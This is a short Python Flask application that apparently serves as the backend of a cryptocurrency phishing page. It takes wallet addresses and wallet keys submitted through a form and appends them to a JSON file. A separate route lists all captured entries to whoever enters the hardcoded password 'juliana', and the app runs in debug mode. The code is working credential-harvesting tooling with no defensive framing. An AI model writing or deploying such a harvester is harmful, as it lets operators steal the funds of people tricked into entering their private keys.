import os
import json
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    wallet_address = request.form['wallet_address']
    wallet_keys = request.form['wallet_keys']
    data = {
        'wallet_address': wallet_address,
        'wallet_keys': wallet_keys,
    }
    with open('data.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    return jsonify({'success': True})

@app.route('/view_data', methods=['GET', 'POST'])
def view_data():
    if request.method == 'POST':
        password = request.form['password']
        if password == 'juliana':  # Change this to your desired password
            with open('data.json') as f:
                data = f.readlines()
            wallet_data = []
            for line in data:
                wallet_data.append(json.loads(line))
            return render_template('data.html', data=wallet_data)
        else:
            return 'Incorrect password'
    return render_template('password.html')

if __name__ == '__main__':
 app.run(debug=True)
